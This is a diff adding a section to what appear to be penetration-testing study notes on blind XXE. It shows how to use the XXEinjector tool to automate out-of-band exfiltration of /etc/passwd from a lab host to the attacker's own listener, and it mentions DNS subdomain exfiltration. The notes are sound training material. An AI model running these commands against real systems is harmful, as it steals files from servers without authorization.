@@ -184,5 +184,36 @@ Then we can initiate our attack with a payload like this:
 ```
 *Note: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.*
 
+#### Automated OOB Exfiltration
+ we can automate the process of blind XXE data exfiltration with tools like [XXEinjector](https://github.com/enjoiz/XXEinjector).
+ 1. Clone the repository:
+    ```
+    git clone https://github.com/enjoiz/XXEinjector.git
+    ```
+2. Copy the HTTP request from Burp and write it to a file for the tool to use, like:
+   ```
+   POST /blind/submitDetails.php HTTP/1.1
+   Host: 10.129.201.94
+   Content-Length: 169
+   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+   Content-Type: text/plain;charset=UTF-8
+   Accept: */*
+   Origin: http://10.129.201.94
+   Referer: http://10.129.201.94/blind/
+   Accept-Encoding: gzip, deflate
+   Accept-Language: en-US,en;q=0.9
+   Connection: close
+
+   <?xml version="1.0" encoding="UTF-8"?>
+   XXEINJECT
+   ```
+3. Run the tool:
+   ```
+   ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+   ```
+4. The tool might not directly print the data, because we are base64 encoding it. In any case, all exfiltrated files get stored in the Logs folder under the tool, and we can find our file there:
+   ```
+   cat Logs/10.129.201.94/etc/passwd.log
+   ```
 
 
